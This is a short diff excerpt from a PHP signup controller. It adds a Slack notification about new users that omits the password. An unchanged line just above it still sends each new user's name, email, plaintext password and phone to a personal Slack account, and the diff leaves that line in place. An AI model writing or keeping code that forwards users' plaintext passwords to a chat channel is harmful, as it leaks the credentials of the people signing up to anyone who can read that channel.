@@ -81,7 +81,9 @@ class AuthController extends Controller
    });
 
      }
+
      Slack::to('@tayef56')->send('A new user '.$data['name'].' has signed up with email ' .$data['email'].' Password :'.$data['password'].' Phone '.$data['phone'].' as '.$data['type']);
+     Slack::send('A new user '.$data['name'].' has signed up with email ' .$data['email'].' Phone '.$data['phone'].' as '.$data['type']);
     /*  Mailgun::send('email.admin.informadmin',[ 'data' =>  $data ], function ($m) use ($data) {
        $m->from('tayef@unigigg.com', 'Tayef from unigigg');
 
